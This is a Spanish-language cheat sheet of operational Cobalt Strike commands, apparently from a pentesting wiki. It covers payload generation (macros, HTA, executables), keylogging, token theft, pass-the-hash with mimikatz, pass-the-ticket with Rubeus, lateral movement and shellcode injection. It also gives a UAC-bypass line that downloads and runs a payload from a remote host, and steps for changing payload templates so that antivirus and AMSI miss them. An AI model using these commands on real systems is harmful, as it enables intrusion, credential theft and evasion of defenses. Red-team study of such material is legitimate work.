# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` luego puedes seleccionar dónde escuchar, qué tipo de beacon usar (http, dns, smb...) y más.

### Peer2Peer Listeners

Los beacons de estos listeners no necesitan comunicarse directamente con el C2, pueden comunicarse a través de otros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` luego necesitas seleccionar los beacons TCP o SMB

* El **beacon TCP establecerá un listener en el puerto seleccionado**. Para conectarte a un beacon TCP usa el comando `connect <ip> <port>` desde otro beacon
* El **beacon smb escuchará en un pipename con el nombre seleccionado**. Para conectarte a un beacon SMB necesitas usar el comando `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** para archivos HTA
* **`MS Office Macro`** para un documento de office con una macro
* **`Windows Executable`** para un .exe, .dll o servicio .exe
* **`Windows Executable (S)`** para un **stageless** .exe, .dll o servicio .exe (mejor stageless que staged, menos IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Esto generará un script/executable para descargar el beacon de cobalt strike en formatos como: bitsadmin, exe, powershell y python

#### Host Payloads

Si ya tienes el archivo que deseas alojar en un servidor web, solo ve a `Attacks -> Web Drive-by -> Host File` y selecciona el archivo para alojar y la configuración del servidor web.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly &#x3C;/path/to/executable.exe>

# Screenshots
printscreen    # Toma una captura de pantalla única mediante el método PrintScr
screenshot     # Toma una captura de pantalla única
screenwatch    # Toma capturas de pantalla periódicas del escritorio
## Ve a View -> Screenshots para verlas

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes para ver las teclas presionadas

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inyectar acción de escaneo de puertos dentro de otro proceso
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importar módulo de Powershell
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;just write powershell cmd here>

# User impersonation
## Generación de token con credenciales
make_token [DOMAIN\user] [password] #Crear token para suplantar a un usuario en la red
ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
rev2self # Dejar de usar el token generado con make_token
## El uso de make_token genera el evento 4624: Una cuenta se ha iniciado sesión correctamente. Este evento es muy común en un dominio de Windows, pero se puede reducir filtrando por el Tipo de Inicio de Sesión. Como se mencionó anteriormente, utiliza LOGON32_LOGON_NEW_CREDENTIALS que es el tipo 9.

# UAC Bypass
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Robar token de pid
## Como make_token pero robando el token de un proceso
steal_token [pid] # Además, esto es útil para acciones de red, no para acciones locales
## De la documentación de la API sabemos que este tipo de inicio de sesión "permite al llamador clonar su token actual". Por eso la salida del Beacon dice Impersonated &#x3C;current_username> - está suplantando nuestro propio token clonado.
ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
rev2self # Dejar de usar el token de steal_token

## Lanzar proceso con nuevas credenciales
spawnas [domain\username] [password] [listener] #Hazlo desde un directorio con acceso de lectura como: cd C:\
## Al igual que make_token, esto generará el evento de Windows 4624: Una cuenta se ha iniciado sesión correctamente, pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).

## Inyectar en proceso
inject [pid] [x64|x86] [listener]
## Desde un punto de vista de OpSec: No realices inyección entre plataformas a menos que realmente sea necesario (por ejemplo, x86 -> x64 o x64 -> x86).

## Pass the hash
## Este proceso de modificación requiere parches en la memoria de LSASS, lo cual es una acción de alto riesgo, requiere privilegios de administrador local y no es muy viable si Protected Process Light (PPL) está habilitado.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash a través de mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá la shell (si estás ejecutando como SYSTEM, estás bien)
steal_token &#x3C;pid> #Robar token de proceso creado por mimikatz

## Pass the ticket
## Solicitar un ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Crear una nueva sesión de inicio de sesión para usar con el nuevo ticket (para no sobrescribir el comprometido)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## Escribir el ticket en la máquina del atacante desde una sesión de powershell &#x26; cargarlo
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket desde SYSTEM
## Generar un nuevo proceso con el ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Robar el token de ese proceso
steal_token &#x3C;pid>

## Extraer ticket + Pass the ticket
### Listar tickets
execute-assembly C:\path\Rubeus.exe triage
### Volcar ticket interesante por luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Crear nueva sesión de inicio de sesión, anotar luid y processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insertar ticket en la sesión de inicio de sesión generada
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finalmente, robar el token de ese nuevo proceso
steal_token &#x3C;pid>

# Lateral Movement
## Si se creó un token, se utilizará
jump [method] [target] [listener]
## Métodos:
## psexec                    x86   Usar un servicio para ejecutar un artefacto de Service EXE
## psexec64                  x64   Usar un servicio para ejecutar un artefacto de Service EXE
## psexec_psh                x86   Usar un servicio para ejecutar una línea de PowerShell
## winrm                     x86   Ejecutar un script de PowerShell a través de WinRM
## winrm64                   x64   Ejecutar un script de PowerShell a través de WinRM

remote-exec [method] [target] [command]
## Métodos:
<strong>## psexec                          Ejecución remota a través del Administrador de Control de Servicios
</strong>## winrm                           Ejecución remota a través de WinRM (PowerShell)
## wmi                             Ejecución remota a través de WMI

## Para ejecutar un beacon con wmi (no está en el comando jump) solo sube el beacon y ejecútalo
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## En el host de metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## En cobalt: Listeners > Add y establece el Payload en Foreign HTTP. Establece el Host en 10.10.5.120, el Puerto en 8080 y haz clic en Guardar.
beacon> spawn metasploit
## Solo puedes generar sesiones de Meterpreter x86 con el listener extranjero.

# Pass session to Metasploit - Through shellcode injection
## En el host de metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Ejecuta msfvenom y prepara el listener multi/handler

## Copia el archivo bin a la máquina host de cobalt strike
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inyectar shellcode de metasploit en un proceso x64

# Pass metasploit session to cobalt strike
## Genera shellcode de Beacon stageless, ve a Attacks > Packages > Windows Executable (S), selecciona el listener deseado, selecciona Raw como el tipo de salida y selecciona Usar carga útil x64.
## Usa post/windows/manage/shellcode_inject en metasploit para inyectar el shellcode generado de cobalt strike


# Pivoting
## Abre un proxy socks en el teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Avoiding AVs

### Artifact Kit

Usualmente en `/opt/cobaltstrike/artifact-kit` puedes encontrar el código y las plantillas precompiladas (en `/src-common`) de los payloads que cobalt strike va a usar para generar los beacons binarios.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con la puerta trasera generada (o solo con la plantilla compilada) puedes encontrar qué está haciendo que el defensor se active. Generalmente es una cadena. Por lo tanto, solo puedes modificar el código que está generando la puerta trasera para que esa cadena no aparezca en el binario final.

Después de modificar el código, solo ejecuta `./build.sh` desde el mismo directorio y copia la carpeta `dist-pipe/` en el cliente de Windows en `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicar a Cobalt Strike que use los recursos del disco que queremos y no los que se cargaron.

### Kit de Recursos

La carpeta ResourceKit contiene las plantillas para las cargas útiles basadas en scripts de Cobalt Strike, incluyendo PowerShell, VBA y HTA.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas, puedes encontrar qué es lo que el defensor (AMSI en este caso) no acepta y modificarlo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando las líneas detectadas se puede generar una plantilla que no será atrapada.

No olvides cargar el script agresivo `ResourceKit\resources.cna` para indicar a Cobalt Strike que use los recursos del disco que queremos y no los que están cargados.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

